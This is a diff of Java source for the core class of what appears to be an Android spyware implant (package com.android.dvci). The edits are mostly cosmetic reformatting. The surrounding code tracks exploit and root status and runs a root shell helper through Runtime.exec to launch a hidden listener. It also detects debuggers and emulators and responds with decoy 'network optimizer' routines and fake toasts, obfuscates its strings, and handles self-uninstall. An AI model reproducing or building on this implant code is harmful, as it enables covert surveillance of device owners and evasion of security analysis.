@@ -7,8 +7,6 @@
 
 package com.android.dvci;
 
-import java.io.IOException;
-
 import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.PendingIntent;
@@ -40,30 +38,44 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.IOException;
+
 /**
  * The Class Core, represents
  */
 public class Core extends Activity implements Runnable {
 
-	/** The Constant SLEEPING_TIME. */
+	/**
+	 * The Constant SLEEPING_TIME.
+	 */
 	private static final int SLEEPING_TIME = 1000;
 	private static final String TAG = "Core"; //$NON-NLS-1$
 	private static final String UNINSTALL_MARKUP = ".l";
 	private static boolean serviceRunning = false;
 
-	/** The b stop core. */
+	/**
+	 * The b stop core.
+	 */
 	private boolean bStopCore = false;
 
-	/** The core thread. */
+	/**
+	 * The core thread.
+	 */
 	private Thread coreThread = null;
 
-	/** The content resolver. */
+	/**
+	 * The content resolver.
+	 */
 	private ContentResolver contentResolver;
 
-	/** The agent manager. */
+	/**
+	 * The agent manager.
+	 */
 	private ManagerModule moduleManager;
 
-	/** The event manager. */
+	/**
+	 * The event manager.
+	 */
 	private ManagerEvent eventManager;
 	private WakeLock wl;
 	// private long queueSemaphore;
@@ -101,10 +113,8 @@ public class Core extends Activity implements Runnable {
 	/**
 	 * Start.
 	 *
-	 * @param resources
-	 *            the r
-	 * @param cr
-	 *            the cr
+	 * @param resources the r
+	 * @param cr        the cr
 	 * @return true, if successful
 	 */
 
@@ -115,12 +125,12 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() +"  exploitResult == " + Status.getExploitResultString());
+				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() + "  exploitResult == " + Status.getExploitResultString());
 			}
 			Status.setIconState(true);
 
 			/* this check is used to know if we need to ask the user for root permission */
-			if ((Status.getExploitStatus() >= Status.EXPLOIT_STATUS_EXECUTED ) && !Status.haveRoot()) {
+			if ((Status.getExploitStatus() >= Status.EXPLOIT_STATUS_EXECUTED) && !Status.haveRoot()) {
 				try {
 					Thread t = new Thread(new Runnable() {
 						@Override
@@ -140,8 +150,8 @@ public class Core extends Activity implements Runnable {
 				}
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (Start): skipped getPermissions() haveRoot=" + Status.haveRoot() + " exploitResult= " + Status.getExploitResultString()+
-							" exploitStatus= " + Status.getExploitStatusString() );
+					Check.log(TAG + " (Start): skipped getPermissions() haveRoot=" + Status.haveRoot() + " exploitResult= " + Status.getExploitResultString() +
+							" exploitStatus= " + Status.getExploitStatusString());
 				}
 
 			}
@@ -204,10 +214,10 @@ public class Core extends Activity implements Runnable {
 
 	public static void deceptionCode2(long mersenne) {
 		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
-		nOptimizer.start((int)(mersenne / 1023));
+		nOptimizer.start((int) (mersenne / 1023));
 	}
 
-    public static void deceptionCode1() {
+	public static void deceptionCode1() {
 		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
 		nOptimizer.start(1000);
 	}
@@ -267,7 +277,7 @@ public class Core extends Activity implements Runnable {
 				// /system/bin/ntpsvd adm
 				String pack = Status.self().getAppContext().getPackageName();
 				String bd = Configuration.shellFile + M.e(" adm");
-				String tbe = String.format("%s %s/%s", bd, pack,  M.e(".listener.AR"));
+				String tbe = String.format("%s %s/%s", bd, pack, M.e(".listener.AR"));
 				// /system/bin/ddf adm
 				// \"com.android.dvci/com.android.dvci.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
@@ -492,7 +502,7 @@ public class Core extends Activity implements Runnable {
 
 			// this markup is created by UninstallAction
 			//final Markup markup = new Markup(UNINSTALL_MARKUP);
-			if(haveUninstallMarkup()){
+			if (haveUninstallMarkup()) {
 				UninstallAction.actualExecute();
 				//TODO: kill checkexploit
 				return ConfType.Error;
@@ -501,7 +511,7 @@ public class Core extends Activity implements Runnable {
 			// Identify the device uniquely
 			final Device device = Device.self();
 
-            // load configuration
+			// load configuration
 			int ret = loadConf();
 
 			if (ret == 0) {
@@ -596,8 +606,7 @@ public class Core extends Activity implements Runnable {
 	 * conf.
 	 *
 	 * @return false if no correct conf available
-	 * @throws GeneralException
-	 *             the rCS exception
+	 * @throws GeneralException the rCS exception
 	 */
 	public int loadConf() throws GeneralException {
 		boolean loaded = false;
@@ -737,8 +746,7 @@ public class Core extends Activity implements Runnable {
 	/**
 	 * Execute action. (Questa non viene decompilata correttamente.)
 	 *
-	 * @param action
-	 *            the action
+	 * @param action  the action
 	 * @param trigger
 	 * @return the int
 	 */
@@ -828,7 +836,7 @@ public class Core extends Activity implements Runnable {
 		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold, true);
 
 		int pid = android.os.Process.myPid();
-		int pids[] = new int[] { pid };
+		int pids[] = new int[]{pid};
 
 		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
 		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
@@ -868,11 +876,11 @@ public class Core extends Activity implements Runnable {
 	}
 
 	public boolean check() {
-		if(Cfg.CHECK_ANTI_DEBUG) {
+		if (Cfg.CHECK_ANTI_DEBUG) {
 			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
 				AntiDebug ad = new AntiDebug();
 				if (ad.isDebug()) {
-					if(Cfg.DEMO){
+					if (Cfg.DEMO) {
 						Status.self().makeToast(M.e("Optimizing network"));
 					}
 					deceptionCode1();
@@ -882,7 +890,7 @@ public class Core extends Activity implements Runnable {
 			if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
 				AntiEmulator am = new AntiEmulator();
 				if (am.isEmu()) {
-					if(Cfg.DEMO){
+					if (Cfg.DEMO) {
 						Status.self().makeToast(M.e("Optimizing memory"));
 					}
 					deceptionCode2(Integer.MAX_VALUE / 1024);
@@ -894,7 +902,7 @@ public class Core extends Activity implements Runnable {
 	}
 
 	public static boolean checkStatic() {
-		if(Cfg.CHECK_ANTI_DEBUG) {
+		if (Cfg.CHECK_ANTI_DEBUG) {
 			if (!Cfg.DEBUG) {
 				AntiDebug ad = new AntiDebug();
 				if (ad.isDebug()) {
@@ -915,7 +923,7 @@ public class Core extends Activity implements Runnable {
 	private boolean haveUninstallMarkup() {
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (haveUninstallMarkup) "+ markup.exists());
+			Check.log(TAG + " (haveUninstallMarkup) " + markup.exists());
 		}
 		return markup.exists();
 	}
